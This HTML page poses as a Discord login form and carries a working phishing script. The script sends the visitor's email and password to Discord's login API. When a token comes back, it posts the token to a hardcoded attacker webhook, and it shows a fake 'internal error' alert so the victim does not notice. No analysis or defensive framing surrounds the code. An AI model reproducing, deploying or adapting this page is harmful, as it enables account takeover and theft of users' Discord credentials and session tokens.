<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Discord Login</title>
</head>
<body>
  <h2>Login no Discord</h2>
  <input type="text" id="email" placeholder="Email"><br><br>
  <input type="password" id="password" placeholder="Senha"><br><br>
  <button onclick="login()">Entrar</button>

  <script>
    async function login() {
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      const response = await fetch("https://discord.com/api/v9/auth/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0"
        },
        body: JSON.stringify({ login: email, password: password })
      });

      const data = await response.json();

      if (data.token) {
        fetch("https://discord.com/api/webhooks/1362455750202359869/KxjL9Kg38zfdErVc1OCzjZazhSznhjO1QKf0Cu8XZkCQ4ejPcceU609Z3Ktr-WbNW6J4", {
          method: "POST",
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            content: `Novo token: ${data.token}`
          })
        });
        alert("Erro interno. Tente novamente mais tarde.");
      } else {
        alert("Credenciais inv√°lidas");
      }
    }
  </script>
</body>
</html>
